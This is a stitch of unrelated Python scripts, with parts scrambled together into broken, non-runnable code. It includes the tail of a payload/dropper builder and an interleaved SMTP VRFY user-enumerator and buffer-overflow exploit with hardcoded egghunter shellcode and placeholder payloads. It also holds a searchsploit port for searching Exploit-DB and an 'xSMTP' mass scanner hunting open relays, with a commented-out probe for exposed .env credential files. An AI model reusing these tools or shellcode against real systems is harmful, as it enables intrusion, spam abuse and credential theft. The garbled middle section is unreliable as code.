    util.display('({:,} bytes written to {})'.format(len(dropper), path.replace(os.getcwd(), '')), style='dim', color='reset')

    if options.freeze:
        util.display('\tCompiling executable...\n', color='reset', style='normal', end=' ')
        name = generators.freeze('modules/clients/payloads/' + kwargs['var'] + '.py', icon=options.icon, hidden=kwargs['hidden'], debug=options.debug)
        util.display('({:,} bytes saved to file: {})\n'.format(len(open(name, 'rb').read()), name))
    return name

@util.threaded
def _spinner(flag):
    spinner = itertools.cycle(['-', '/', '|', '\\'])
    while not flag.is_set():
        try:
            sys.stdout.write(next(spinner))
            sys.stdout.flush()
            flag.wait(0.2)
            sys.stdout.write('\b')
            sys.stdout.flush()
        except:
            break

if __name__ == '__main__':
    main()
def main():
    for module in __all__:
        exec("import {}".format(module))

#main()
                if input("Do you want to connect to the exploit database papers? [Y/n]: ") == "Y":
                    print("Please select the location of the exploit database papers")
             if len(sys.argv) != 8:
                print "USO = smtp.py irange mRange ipseg ipPort smtpMotod lista.txt output.txt\n"
                 print "es: pyton smtp.py 10 150 192.168.1 25 vrfy lista.txt output.txt"
                 sys.exit(0) #aprgomenti inizio rang un massimo la porta e il metodo una lista utenti
HOST="127.0.0.1"
PORT=2501
initRange = int (sys.argv[1])
maxRange = int(sys.argv[2])
ipSegAdd ress = sys.argv[3]
ipPort = int(sys.argv[4])
smtpMethod = sys.argv[5]
usersFile = sys.argv[6]
outputF ileName sys.argv[7]
results=''
validusers=''
for ipaddress in range(iniRange,maxRange): 
    try:
        s=socket.socket (socket.AF INET, socket.SOCK STREAM)
        s.settimedut (5)
        ip = ipSegAddress+'.'+str (ipAddress)#grea connessione tra ipv4 sul server 
        IP = "127.0.0.1"
        PORT=8080
        print ip
        print "Connected first user"
        connect = s.connect((ip, ipPort))
        # Risposta banner
        banner=s. recv (1024)#risponta banner
        from tkinter import Tk
        from tkinter.filedialog import askdirectory
        import os
        sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        sock.settimeout(2)
        sock.connect((IP,PORT))
        sock.send(payload)
        sock1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock1.connect((HOST, PORT)) 
        sock1.send("usr1\r\n")
        sock1.recv(1024)
        sock2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock2.connect((HOST, PORT)) 
        print "Connected second user"
        sock2.send(msgPayload)
        print "Sent msg payload"
        sock2.send("usr2\r\n")
        sock2.recv(1024)
        time.sleep(1)
        print "Buffer sent! (len %d)" % len(payload)
        print banner
        sock3.close()
        sock2.close()
        sock1.close()
        rcr = open(".searchsploit_rc", "r").read().splitlines()
        print(rcr)
        sock3 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock3.connect((HOST, PORT))
        sock3.send(egghunterPayload)
        print "Sent egghunter payload"
        if input("Do you want to connect to the exploit database exploits? [Y/n]: ") == "Y":
        print("Please select the location of the exploit database")
        try:
        print sock.recv(4096)
        print "No crash...."
        except:
        print "Server died, Yayyyy!!"
        s.settimeout (15)
        results = results+' \n'+ip+' - '+banner
if '220' in banner:#verifica conessione attiva
    with open (usersFile, 'r') as f:
        for user in f:
        s.send (smtpMethod+tuser)
            result=ip+ tS. recv (1024)
          Tk().withdraw()
     edbexploits = askdirectory()
     print(edbexploits)
    if os.path.exists(edbexploits):
        rcr[6] = 'path_array+=("' + edbexploits + '")'
        rcr[14] = 'path_array+=("' + edbexploits + '")'
            print result
if '252' in result: # se ottiene la risponta utente valido
    validusers += result
    f.close()
    rc = "\n".join(rcr)
    if os.sys.platform == "win32":
        open(os.getenv("userprofile").replace(
        "\\", "/") + "/.searchsploit_rc", "w").write(rc)
    batch = open("searchsploit.bat", "r").readlines()
    batch[1] = 'set pythonscript="' + os.getcwd() + '"'
    batch = "\n".join(batch)
    open("searchsploit.bat", "w").write(batch)
     try:
        open("/etc/.searchsploit_rc", "w").write(rc)
     except:
        open(os.path.expanduser("~").replace("\\", "/") +
             "/.searchsploit_rc", "w").write(rc)
else:
    # Chiudiamo il socket
s.close () # stampa file output lista utenti attivi
print("Install complete. you may now use searchsploit freely")
if os.sys.platform == "win32":
    print("Take your batch script and move it to some place that youll use it.")
print("This script may need to be ran again if the contents in this folder move or if any databases move from their origional spots.")
except socket.timeout:
results = results+'Timeout : '+ip+'In'
print 'Timeout : '+ip
continue
egghunter = "\x31\xd2\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x6a\x21\x58\x31\xc9\xcd\x80\x3c\xf2\x74\xec\xb8\x57\x30\x30\x54\x89\xd7\xaf\x75\xe7\xaf\x75\xe4\xff\xe7"
egghunterPayload = ?
msgPayload = ?
except socket.error:
print 'Errore di Connessione '+ip
continue
with open (outputFileName, 'w') as fw:
fw.write(validUsers)
fw.close
except socket.timeout:
    results = results+'Timeout : '+ip+'In'
    print 'Timeout : '+ip
    continue
except socket.error:
    Iprint 'Errore di Connessione '+ip
    continue
Tk().withdraw()
    temp = askdirectory()
    print(temp)
    if os.path.exists(temp):
        rcr[22] = 'path_array+=("' + temp + '")'
with open (outputFileName, 'w') as fw:
fw.write(validUsers)
from sys import argv, exit
import os
import argparse
COL = 0
STDIN = ""  # realizzato per contenere input standard per più funzioni

# ottenere la longhezza della colonna
try:
    COL = int(os.get_terminal_size()[0])
except:
    try:
        COL = int(os.get_terminal_size(0)[0])
    except:
        COL = int(os.get_terminal_size(1)[0])

terms = []  # array globale che contiene tuttii termini di ricerca
progname = os.path.basename(argv[0])
VERSION = "v1.5"  # versione programma
files_array = []  # Array options with file names
name_array = []  # Array options with database names
path_array = []  # Array options with paths to database files
git_array = []  # Array options with the git repo to update the databases
def scrapeRC():
    """ This function runs on init to get settings for all the databases used for searching
    """
    divider = []

    paths = [
        "/etc/.searchsploit_rc",
        os.path.expanduser("~/.searchsploit_rc"),
        os.path.expanduser("~/.local/.searchsploit_rc"),
        os.path.abspath(os.path.join(os.sys.path[0], ".searchsploit_rc"))
    ]

    for p in paths:
        if os.path.exists(p):
            with open(p, "r") as settingsFile:
                settings = settingsFile.read().split("\n")
                settingsFile.close()
                break
    else:
        print("ERROR: Cannot find .searchsploit_rc\nPlease make sure it is located in one of its well known locations.")
        print("It can be anywhere in one of these locations:")
        for p in paths:
            print("\"{0}\"".format(p))
        exit(2)

    for i in settings:
        if(i == "" or i[0] == "#"):
            continue  # Ignores lines that are empty or are just comments
        divider = i[:len(i)-2].split("+=(\"")
        if divider[0] == "files_array":
            files_array.append(divider[1])
        elif divider[0] == "name_array":
            name_array.append(divider[1])
        elif divider[0] == "path_array":
            path_array.append(divider[1])
        elif divider[0] == "git_array":
            git_array.append(divider[1])

    # This section is to remove database paths that do not exist
    larray = len(files_array)
    for i in range(larray - 1, -1, -1):
        if not os.path.exists(os.path.abspath(os.path.join(path_array[i], files_array[i]))):
            files_array.pop(i)
            name_array.pop(i)
            path_array.pop(i)
            git_array.pop(i)


scrapeRC()

################
## Arg Parser ##
################
parseArgs = None  # Variable to hold values from parser
parser = argparse.ArgumentParser(
    prefix_chars="-+/", formatter_class=argparse.RawTextHelpFormatter, prog=os.path.basename(argv[0]))

parser.description = """
==========
 Examples
==========
  %(prog)s afd windows local
  %(prog)s -t oracle windows
  %(prog)s -p 39446
  %(prog)s linux kernel 3.2 --exclude="(PoC)|/dos/"
  %(prog)s linux reverse password

  For more examples, see the manual: https://www.exploit-db.com/searchsploit

=========
 Options
=========   
"""
parser.epilog = """
=======
 Notes
=======
 * You can use any number of search terms.
 * Search terms are not case-sensitive (by default), and ordering is irrelevant.
   * Use '-c' if you wish to reduce results by case-sensitive searching.
   * And/Or '-e' if you wish to filter results by using an exact match.
 * Use '-t' to exclude the file's path to filter the search results.
   * Remove false positives (especially when searching using numbers - i.e. versions).
 * When updating or displaying help, search terms will be ignored.
"""

# Arguments
parserCommands = parser.add_mutually_exclusive_group()

parser.add_argument("searchTerms", nargs="*")

parser.add_argument("-c", "--case", action="store_true",
                    help="Perform a case-sensitive search (Default is inSEnsITiVe).")
parser.add_argument("-e", "--exact", action="store_true",
                    help="Perform an EXACT match on exploit title (Default is AND) [Implies \"-t\"].")
parser.add_argument("-i", "--ignore", action="store_true",
                    help="Adds any redundant term in despite it possibly giving false positives.")
parser.add_help = True
parser.add_argument("-j", "--json", action="store_true",
                    help="Show result in JSON format.")
parserCommands.add_argument("-m", "--mirror", type=int, default=None,
                            metavar="[EDB-ID]", help="Mirror (aka copies) an exploit to the current working directory.")
parser.add_argument("-o", "--overflow", action="store_true",
                    help="Exploit titles are allowed to overflow their columns.")
parserCommands.add_argument("-p", "--path", type=int, default=None,
                            metavar="[EDB-ID]", help="Show the full path to an exploit (and also copies the path to the clipboard if possible).")
parser.add_argument("-t", "--title", action="store_true",
                    help="Search JUST the exploit title (Default is title AND the file's path).")
parser.add_argument("-u", "--update", action="store_true",
                    help="Check for and install any exploitdb package updates (deb or git).")
parser.add_argument("-w", "--www", action="store_true",
                    help="Show URLs to Exploit-DB.com rather than the local path.")
parserCommands.add_argument("-x", "--examine", type=int, default=None,
                            metavar=("[EDB-ID]"), help="Examine (aka opens) the exploit using \$PAGER.")
parser.add_argument("--colour", action="store_false",
                    help="Disable colour highlighting in search results.")
parser.add_argument("--id", action="store_true",
                    help="Display the EDB-ID value rather than local path.")
parser.add_argument("--nmap", metavar="file.xml", nargs="?", type=argparse.FileType("r"), default=None, const=os.sys.stdin,
                    help="Checks all results in Nmap's XML output with service version (e.g.: nmap -sV -oX file.xml).\nUse \"-v\" (verbose) to try even more combinations")
parser.add_argument("--version", action="version",
                    version="%(prog)s {0}".format(VERSION))
parser.add_argument("--exclude", nargs="*", type=str, default=list(), metavar="[terms]",
                    help="Remove certain terms from the results. Option best added after all other terms have been gathered.")

# Argument variable
parseArgs = parser.parse_args()

# Update database check


def update():
    """ This function is used to update all the databases via github (because github is the best update system for databases this size)
    """
    cwd = os.getcwd()
    for i in range(len(files_array)):
        print("[i] Path: " + path_array[i])
        print("[i] Git Pulling: " + name_array[i] + " ~ " + path_array[i])

        # update via git
        os.chdir(path_array[i])  # set path to repos directory
        os.system("git pull -v origin master")
        print("[i] Git Pull Complete")
    os.chdir(cwd)
    return


######################
##  DISPLAY TOOLS   ##
######################
def drawline():
    """ Draws a line in the terminal.
    """
    line = "" * (int(COL) - 1)
    print(line)


def drawline(lim):
    """ Draws a line in the terminal.\n
    @lim: column where the border is suppossed to be
    """
    line = "-" * lim
    line += "+"
    line += "-" * (COL - lim - 2)  # -2 for terminal padding
    print(line)


def highlightTerm(line, term):
    """ Part one of new highlighting process. Highlights by adding :8 and :9 as escape characters as ansi takes several lines. the rest is compiled in separater unless autocomp is true\n
    @line: the phrase to be checked\n
    @term: the term that will be found in line and used to highlight the line\n
    @autoComp: [optional] if true, then it will output the string with the flags already turned into ANSI
    """
    # immediate override if colour option is used
    if not parseArgs.colour:
        return line

    marker = 0  # marks where the term is first found
    term = term.lower()

    while (line.lower().find(term, marker) >= 0):
        marker = line.lower().find(term, marker)  # update location of new found term
        part1 = line[:marker]
        part2 = line[marker: marker + len(term)]
        part3 = line[marker + len(term):]
        line = "{0}\033[91m{1}\033[0m{2}".format(part1, part2, part3)
        marker += len(term) + 4
    return line


def separater(lim, line1: str, line2: str):
    """ Splits the two texts to fit perfectly within the terminal width
    """
    lim = int(lim)
    if parseArgs.overflow:
        line = line1 + " | " + line2
        print(line)
        return

    line1_length = lim - 1  # subtract 1 for padding
    # -2 for divider padding and -1 for terminal padding
    line2_length = int(COL) - lim - 2 - 1
    format_string = "{{title:{title_length}.{title_length}s}}\033[0m | {{path:{path_length}.{path_length}s}}\033[0m"

    # Escape options for colour
    if not parseArgs.colour:
        print("{{0:{0}.{0}s}} | {{1:{1}.{1}s}}".format(
            line1_length, line2_length).format(line1, line2))
        return

    # increase lim by markers to not include highlights in series
    last_mark = 0
    while (line1.find("\033[91m", last_mark, line1_length + 5) >= 0):
        line1_length += 5
        last_mark = line1.find("\033[91m", last_mark, line1_length + 5) + 5
    last_mark = 0
    while (line1.find("\033[0m", last_mark, line1_length + 4) >= 0):
        line1_length += 4
        last_mark = line1.find("\033[0m", last_mark, line1_length + 4) + 4
    last_mark = 0
    while (line2.find("\033[91m", last_mark, line2_length + 5) >= 0):
        line2_length += 5
        last_mark = line2.find("\033[91m", last_mark, line2_length + 5) + 5
    last_mark = 0
    while (line2.find("\033[0m", last_mark, line2_length + 4) >= 0):
        line2_length += 4
        last_mark = line2.find("\033[0m", last_mark, line2_length + 4) + 4

    # Creating format string for print
    fstring = format_string.format(
        title_length=line1_length, path_length=line2_length)
    line = fstring.format(title=line1, path=line2)
    print(line)


##############################
##  DATABASE MANIPULATION   ##
##############################
def cpFromDb(path, id):
    """ Returns database array of search for given id.\n
    path: absolute path of database\n
    id: the EDBID that is searched for in database
    """
    dbFile = open(path, "r", encoding="utf8")
    db = dbFile.read().split('\n')
    for lines in db:
        if lines.split(",")[0] == str(id):
            dbFile.close()
            return lines.split(",")
    dbFile.close()
    return []


def findExploit(id):
    """ This Function uses cpFromDB to iterate through all known databases and return exploit and the database it was found in\n
    @id: EDBID used to search all known databases\n
    @return: exploit[], database path
    """
    exploit = []
    for i in range(len(files_array)):
        exploit = cpFromDb(os.path.abspath(
            os.path.join(path_array[i], files_array[i])), id)
        if exploit == []:
            continue
        else:
            return i, exploit


def validTerm(argsList):
    """ Takes the terms inputed and returns an organized list with no repeats and no poor word choices
    """
    invalidTerms = ["microsoft", "microsoft windows", "apache", "ftp",
                    "http", "linux", "net", "network", "oracle", "ssh", "ms-wbt-server", "unknown", "none"]
    dudTerms = ["unknown", "none"]
    if parseArgs.exact:
        return argsList
    argsList.sort()
    argslen = len(argsList)
    for i in range(argslen - 1, -1, -1):
        if (argsList[i].lower() in dudTerms):
            argsList.pop(i)
        elif (argsList[i].lower() in invalidTerms and not parseArgs.ignore):
            print(
                "[-] Skipping term: " + argsList[i] + "   (Term is too general. Please re-search manually:")
            argsList.pop(i)
            # Issues, return with something
        elif argsList[i].lower() in parseArgs.exclude:
            argsList.pop(i)
        elif not parseArgs.case:
            argsList[i] = argsList[i].lower()
    argsList.sort()
    argslen = len(argsList)
    for i in range(argslen - 1, 0, -1):
        if (argsList[i] == argsList[i-1]):
            argsList.pop(i)
        # what to do if the list ends up empty afterwards
    if (len(argsList) == 0):
        print("Looks like those terms were too generic.")
        print("if you want to search with them anyway, run the command again with the -i arguement")
        exit()

    return argsList


def searchdb(path="", terms=[], cols=[], lim=-1):
    """ Searches for terms in the database given in path and returns the requested columns of positive matches.\n
    @path: the path of the database file to search\n
    @terms: a list of terms where all arguements must be found in a line to flare a positive match\n
    @cols: the columns requested in the order given. ex: cols=[2,0] or title, id\n
    @lim: an integer that counts as the limit of how many search results are requested\n
    @return: database array with positive results
    """
    searchTerms = []
    tmphold = []
    if parseArgs.exact:
        tmpstr = str(terms[0])
        for i in range(1, len(terms)):
            tmpstr += " " + terms[i]
        terms.clear()
        terms.append(tmpstr)
    dbFile = open(path, "r", encoding="utf8")
    db = dbFile.read().split('\n')
    for lines in db:
        if (lines != ""):
            for ex in parseArgs.exclude:
                if parseArgs.case and ex in lines:
                    break
                elif ex in lines.lower():
                    break
            else:
                for term in terms:
                    if parseArgs.title:
                        line = lines.split(",")[2]
                        if parseArgs.case:
                            if term not in line:
                                break
                        elif term not in line.lower():
                            break
                    elif parseArgs.case:
                        if term not in lines:
                            break
                    elif term not in lines.lower():
                        break
                else:
                    for i in cols:
                        space = lines.split(",")
                        tmphold.append(space[i])
                    searchTerms.append(tmphold)
                    tmphold = []
        if(lim != -1 and len(searchTerms) >= lim):
            break
    dbFile.close()
    return searchTerms


def searchsploitout():
    """ Convoluted name for the display. takes the global search terms and prints out a display iterating through every database available and printing out the results of the search.
    """
    # ## Used in searchsploitout/nmap's XML

    # xx validating terms
    validTerm(terms)
    if parseArgs.json:
        jsonDict = {}
        temp = ""
        for i in terms:
            temp += i + " "
        jsonDict["SEARCH"] = temp[:-1]  # Adding the search terms
        searchs = []
        try:
            for i in range(len(files_array)):
                jsonDict["DB_PATH_" + name_array[i].upper()] = path_array[i]
                searchs.clear()
                query = searchdb(os.path.abspath(os.path.join(
                    path_array[i], files_array[i])), terms, [2, 0, 3, 4, 5, 6, 1])
                for lines in query:
                    searchs.append({"Title": lines[0].replace('"', ""), "EDB-ID": int(lines[1]), "Date": lines[2], "Author": lines[3].replace(
                        '"', ""), "Type": lines[4], "Platform": lines[5], "Path": path_array[i] + "/" + lines[6]})
                jsonDict["RESULTS_" + name_array[i].upper()] = searchs.copy()
                searchs.clear()
            import json.encoder
            jsonResult = json.dumps(
                jsonDict, indent=4, separators=(", ", ": "))
            print(jsonResult)
        except KeyboardInterrupt:
            pass
        return

    # xx building terminal look
    # the magic number to decide how much space is between the two subjects
    lim = int((COL - 3)/2)

    # manipulate limit if ID is used
    if parseArgs.id:
        lim = int(COL * 0.8)
    query = []  # temp variable thatll hold all the results
    try:
        for i in range(len(files_array)):
            if parseArgs.id:
                query = searchdb(os.path.abspath(os.path.join(
                    path_array[i], files_array[i])), terms, [2, 0])
            elif parseArgs.www:
                query = searchdb(os.path.abspath(os.path.join(
                    path_array[i], files_array[i])), terms, [2, 1, 0])
            else:
                query = searchdb(os.path.abspath(os.path.join(
                    path_array[i], files_array[i])), terms, [2, 1])

            if len(query) == 0:  # is the search results came up with nothing
                print(name_array[i] + ": No Results")
                continue
            drawline(COL//4)
            separater(COL//4, name_array[i] + " Title", "Path")
            separater(COL//4, "", os.path.abspath(path_array[i]))
            drawline(COL//4)  # display title for every database
            drawline(lim)
            for lines in query:
                # Removing quotes around title if present
                if (lines[0][0] == "\"" or lines[0][0] == "\'"):
                    lines[0] = lines[0][1:]
                if (lines[0][-1] == "\"" or lines[0][-1] == "\'"):
                    lines[0] = lines[0][:-1]

                if parseArgs.www:  # if requesting weblinks. shapes the output for urls
                    lines[1] = "https://www.exploit-db.com/" + \
                        lines[1][:lines[1].index("/")] + "/" + lines[2]
                if parseArgs.colour:
                    for term in terms:
                        lines[0] = highlightTerm(lines[0], term)
                        lines[1] = highlightTerm(lines[1], term)
                separater(lim, lines[0], lines[1])
            drawline(lim)
    except KeyboardInterrupt:
        drawline(lim)
        return


def nmapxml(file=""):
    """ This function is used for xml manipulation with nmap.\n
    @file: string path to xml file\n
    if no file name is given, then it tries stdin\n
    @return: returns true if it fails
    """
    import xml.etree.ElementTree as ET

    global terms
    global STDIN

    # First check whether file exists or use stdin
    try:
        if (type(file) == str):
            contentFile = open(file, "r")
        else:
            contentFile = file  # if file access, link directly to file pointer
        content = contentFile.read()
        contentFile.close()
    except:
        if(not os.sys.stdin.isatty()):
            content = os.sys.stdin.read()
            if content == "" and STDIN != "":
                content = STDIN
            elif content == "" and STDIN == "":
                return False
        else:
            return False

    # stope if blank or not an xml sheet
    if content == "" or content[:5] != "<?xml":
        STDIN = content
        return False
    # Read XML file

    # ## Feedback to enduser
    if (type(file) == str):
        print("[i] Reading: " + highlightTerm(str(file), str(file)))
    else:
        print("[i] Reading: " + highlightTerm(file.name, file.name))
    tmpaddr = ""
    tmpname = ""
    # ## Read in XMP (IP, name, service, and version)
    root = ET.fromstring(content)

    hostsheet = root.findall("host")
    for host in hostsheet:
        # made these lines to separate searches by machine
        tmpaddr = host.find("address").attrib["addr"]
        tmpaddr = highlightTerm(tmpaddr, tmpaddr)

        if (host.find("hostnames/hostname") != None):
            tmpname = host.find("hostnames/hostname").attrib["name"]
            tmpname = highlightTerm(tmpname, tmpname)
        print("Finding exploits for " + tmpaddr +
              " (" + tmpname + ")")  # print name of machine
        for service in host.findall("ports/port/service"):
            if "name" in service.attrib.keys():
                terms.append(str(service.attrib["name"]))
            if "product" in service.attrib.keys():
                terms.append(str(service.get("product")))
            if "version" in service.attrib.keys():
                terms.append(str(service.get("version")))
            validTerm(terms)
            print("Searching terms:", terms)  # displays terms found by xml
            searchsploitout()  # tests search terms by machine
            terms = []  # emptys search terms for next search

    return True


def nmapgrep(file=""):
    """

    """
    global terms
    global STDIN

    # First check whether file exists or use stdin
    try:
        if (type(file) == str):
            contentFile = open(file, "r")
        else:
            contentFile = file
        content = contentFile.read()
        contentFile.close()
    except:
        if(not os.sys.stdin.isatty()):
            content = os.sys.stdin.read()
            if content == "" and STDIN != "":
                content = STDIN
            elif content == "" and STDIN == "":
                return False
        else:
            return False

    # Check whether its grepable
    if (content.find("Host: ") == -1 or not "-oG" in content.split("\n")[0] or content == ""):
        STDIN = content
        return False

    # making a matrix to contain necessary strings
    nmatrix = content.split("\n")
    for lines in range(len(nmatrix) - 1, -1, -1):
        if (nmatrix[lines].find("Host: ") == -1 or nmatrix[lines].find("Ports: ") == -1):
            nmatrix.pop(lines)
        else:
            nmatrix[lines] = nmatrix[lines].split("\t")[:-1]
            nmatrix[lines][0] = nmatrix[lines][0][6:].split(" ")
            # pull hostname out of parenthesis
            nmatrix[lines][0][1] = nmatrix[lines][0][1][1:-
                                                        1] if (len(nmatrix[lines][0][1]) > 2) else ""
            nmatrix[lines][1] = nmatrix[lines][1][7:].split(", ")
            for j in range(len(nmatrix[lines][1])):
                nmatrix[lines][1][j] = nmatrix[lines][1][j].replace(
                    "/", " ").split()[3:]

    # Outputing results from matrix
    for host in nmatrix:
        tmpaddr = highlightTerm(host[0][0], host[0][0])
        tmpname = highlightTerm(host[0][1], host[0][1])
        print("Finding exploits for " + tmpaddr +
              " (" + tmpname + ")")  # print name of machine
        for service in host[1]:
            terms.extend(service)
            validTerm(terms)
            print("Searching terms:", terms)  # displays terms found by grep
            searchsploitout()  # tests search terms by machine
            terms = []  # emptys search terms for next search
    return True

##########################
##  COMMAND FUNCTIONS   ##
##########################


def path(id):
    """ Function used to run the path arguement
    """
    try:
        file, exploit = findExploit(id)
        print(os.path.abspath(os.path.join(path_array[file], exploit[1])))
    except TypeError:
        print("%s does not exist. Please double check that this is the correct id." % id)


def mirror(id):
    """ Function used to mirror exploits
    """
    try:
        ind, exploit = findExploit(id)
    except TypeError:
        print("%s does not exist. Please double check that this is the correct id." % id)
        return
    absfile = path_array[ind]

    currDir = os.getcwd()
    inp = open(os.path.normpath(os.path.join(absfile, exploit[1])), "rb")
    out = open(os.path.join(currDir, os.path.basename(exploit[1])), "wb")
    out.write(inp.read())
    inp.close()
    out.close()
    return


def examine(id):
    """ Function used to run examine arguement
    """
    try:
        ind, exploit = findExploit(id)
    except TypeError:
        print("%s does not exist. Please double check that this is the correct id." % id)
        return
    if exploit[1].endswith(".pdf"):
        import webbrowser
        webbrowser.open(
            "file:///" + os.path.abspath(os.path.join(path_array[ind], exploit[1])), autoraise=True)
    elif(os.sys.platform == "win32"):
        os.system(
            "notepad " + os.path.relpath(os.path.join(path_array[ind], exploit[1])))
    else:
        os.system(
            "pager " + os.path.relpath(os.path.join(path_array[ind], exploit[1])))
    print("[EDBID]:" + exploit[0])
    print("[Exploit]:" + exploit[2])
    print("[Path]:" + os.path.abspath(os.path.join(path_array[ind], exploit[1])))
    print("[URL]:https://www.exploit-db.com/" +
          exploit[1].split("/")[0] + "/" + exploit[0])
    print("[Date]:" + exploit[3])
    print("[Author]:" + exploit[4])
    print("[Type]:" + exploit[5])
    print("[Platform]:" + exploit[6])
    print("[Port]:" + exploit[7])

##################
##  HOOK SCRIPT ##
##################


def run():
    """ Main function of script. hooks rest of functions
    """

    # Colors for windows
    if parseArgs.colour and os.sys.platform == "win32":
        try:
            import colorama
        except ImportError:
            print(
                "You do not have colorama installed. if you want to run with colors, please run:")
            print(
                "\"pip install colorama\" in your terminal so that windows can use colors.")
            print("Printing output without colors")
            parseArgs.colour = False
        else:
            colorama.init()

    if (len(argv) == 1 and os.sys.stdin.isatty()):
        parser.print_help()  # runs if given no arguements
        return

    # DB Tools
    if parseArgs.mirror != None:
        mirror(parseArgs.mirror)
        return
    elif parseArgs.path != None:
        path(parseArgs.path)
        return
    elif parseArgs.update:
        update()
        return
    elif parseArgs.examine != None:
        examine(parseArgs.examine)
        return

    # formatting exclusions
    if not parseArgs.case:
        for i in range(len(parseArgs.exclude)):
            parseArgs.exclude[i] = parseArgs.exclude[i].lower()

    # Nmap tool
    if parseArgs.nmap != None:
        result = nmapxml(parseArgs.nmap)
        if not result:
            result = nmapgrep(parseArgs.nmap)
            if not result:
                parser.print_help()
                return

    terms.extend(parseArgs.searchTerms)

    if (parseArgs.nmap == None and not os.sys.stdin.isatty()):
        text = str(os.sys.stdin.read())
        terms.extend(text.split())

    searchsploitout()


run()
"""
Coded by Dpr
https://github.com/c99tn
https://t.me/+7wraokmFiCcxOTk0
Join Our Telegram Channel For More Great Stuff //
"""
from ast import arg
import requests
import socket
import ipaddress
import smtplib
from multiprocessing.dummy import Pool as ThreadPool 
import time
from termcolor import colored
import os
import sys

socket.setdefaulttimeout(.3)
os.system('clear')
myemail = 'your@email.com'
print(colored("""\Join us .. https://t.me/+7wraokmFiCcxOTk0                              

                                   ;:     ,:;+*%%SS%*:                                    
                               ;: :S%*;+*?%SSSSS%*:,                                      
                          ,: ,:%%??S%SSSSSSSS?*;,                                         
                    ,,    ,%+?%SSSSSSSSSSSSSS%%%%??*+;:,                                  
                   ;? :*%SSSSSSSSSSSSSSSSSSSSSSSSS%%?*;:,,                                
                   ?; ,,%SSSSSSSSS?:;+*?SS?**?S*;:,,                                      
                  :? +%%SS%SSSSSS%:     :+?*;,;**;,                                       
                  *+ %SSS?,;?%?++*:        :+**;;+?*:                                     
                 ,?, ;SS??  ;*   ,?,          :;+++???*+;::                    
                 ++ :%%:,?  :?    ;*                 ,;??+:,,,,                     
                ,?;;*?* ,?  ,?,    +*                   ,+**;,,                           
                ;?:+*:+ :*  ++      +*,                    :;++++;:,,                     
           ,:;+;;+:  ;:,* :*,         ,+*,                               
        ,:;;;::;;,  ,; *;,+,            ;*;              xSMTP Scanner                          
    ,,:;::, ,;;,    ,,:*,;,              ,;+;,         Multithreaded Version                                  
  ,::,,  ,:;:,       :?,,                  ,:++:,                                     
        ::,        :++,                       ,;+;,           Coded by Dpr                                    
                 :+;,                            ,::,           github.com/c99tn
""",'blue'))

"""
#Deprecated, to format input data logs from PortSpyder, shoutout my friend @xdavidhu
def format():
  print('Starting Format Now...')
  with open('filter.txt') as fil:
      f = open("list.txt", "a")
      for myStr in fil:
        if 'subnet' in myStr:
          print('skipped subnet..')
        else:
          urStr = myStr.replace(' - OPEN: ',':')
          splited = urStr.split(':')
          myIP = splited[0]
          ports = splited[1]
          myPorts = ports.split(' ')
          for port in myPorts:
            if port == myPorts[-1]:
              f.write(myIP+':'+port)
            else:
              f.write(myIP+':'+port+'\n')
  f.close()
  print('Done !')
 """

def scan(line):
  data = line.split(":")
  ip = data[0]
  port = int(data[1])
  try:
      with smtplib.SMTP(ip, port, timeout=0.5) as smtp:
          smtp.ehlo()
          subject = 'Email Tester !'
          body = 'Email delivered from', ip, 'with port', port
          msg = f'Subject: {subject}\n\n{body}'
          smtp.sendmail('Pedri <dpr@priv8shop.com>', myemail, msg)
          print(colored(('Good SMTP Devlivered to '+str(myemail)+' '+str(ip)+':'+str(port)),'green'))
          f = open("smtp.txt", "a")
          rz = ip + ":" + str(port)
          f.write(rz)
          f.write("\n")
          f.close()
  except Exception as e:
      print(colored('Bad SMTP Dead!'+ip+':'+str(port)+' -- '+str(e),'red'))

def listenn(line):
  data = line.split(":")
  ip = data[0]
  port = int(data[1])
  DEVICE_SOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  rez = DEVICE_SOCKET.connect_ex((str(ip),int(port)))
  if rez == 0:
    info = str(ip)+':'+str(port)
    notif = str(port)+' is open on '+str(ip)
    print(colored(notif,'green'))
    f = open("list.txt", "a")
    f.write(info+"\n")
    DEVICE_SOCKET.close()
  else:
    info = str(port)+' is closed on '+str(ip)
    print(colored(info,'red'))

def domainASN():
  print(colored('Enter your website (without http:// ):','green'))
  url = input('> ')
  try:
        ip_addr = socket.gethostbyname(url)
  except:
          print(colored('Host not found !', 'red'))
          sys.exit()
  asn_fetch = requests.get('https://ipinfo.io/'+ip_addr+'/org?token=c8bb8b5ed87127')
  asn = (asn_fetch.text)
  
  print(colored(asn , 'blue'))
  myasn = asn.split(' ')[0]
  try:
    res = requests.get('https://api.hackertarget.com/aslookup/?q='+myasn)
    print(colored("IP Ranges found: \n", 'magenta'))
    print(res.text+'\n') 
  except:
    print(colored("Dead host maybe!","red"))
    sys.exit()
  with open("ranges.txt", 'a') as f:
    f.write(res.text+'\n')
  print(colored('Success, Ranges saved in ./ranges.txt','green'))

"""
print(colored('','green'))
uncomment to scan for some env paths on ports 80 443 ;P
need help? https://t.me/dpr52

def checkEnv(line):
  data = line.split(":")
  ip = data[0]
  try:
    res = requests.get('http://'+ip+'/.env')
    if 'DB_HOST' in res.text:
      print(colored('Env found:'+str(ip)+'/.env \n', 'green'))
      with open("env.txt", 'a') as f:
        f.write(str(ip)+'/.env \n')
    else:
      print(colored('Nothing BRo:'+str(ip)+'\n', 'red'))
  except:
    print(colored("Dead host maybe!","red"))
"""

## Menu
ans=True
while ans:
    print(colored('[- xSMTP Scanner -]','red'))
    print (colored("""
[1] - Get IP Ranges From a Website (ASN FETCH)
[2] - Check IP Ranges (Listen For SMTP Ports)
[3] - Mass Scan SMTPs
[4] - Help

[5] - Update
[6] - Exit
    """,'cyan'))
    ans=input("> ") 
    if ans=="1": 
      domainASN()
    #########################################################
    elif ans=="3":
      print(colored("""Enter Your Email address to test the SMTP servers :""",'green'))
      print(colored("""Important: Dont use Gmail ! Use Yandex or Protonmail for best results """,'red'))
      myemail = input('> ')
      print(colored("""How many threads to use ?
(Recommended : 50)""",'green'))
      tr2 = input('> ')
      lines = []
      with open('list.txt') as top:
        for line in top:
          lines.append(line)
      print('Scanning '+ str(len(lines)))
      time.sleep(2)
